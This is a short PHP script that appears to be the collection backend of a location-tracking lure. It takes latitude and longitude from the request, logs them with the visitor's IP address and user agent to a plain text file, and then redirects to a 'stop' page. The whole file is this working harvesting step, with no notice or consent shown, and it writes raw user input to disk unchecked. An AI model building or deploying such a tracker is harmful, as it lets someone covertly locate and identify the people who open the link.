<?php
$lat = $_GET['lat'];
$long = $_GET['long'];
$ip = $_SERVER['REMOTE_ADDR'];
$use = $_SERVER['HTTP_USER_AGENT'];
$add = "latitude: $lat \r longitude: $long \r IP: $ip \r User: $use \r ____________ \r";
$file = fopen("data.txt", "a+");
fwrite($file, $add);
fclose($file);
header("location:/stop.html");
?>
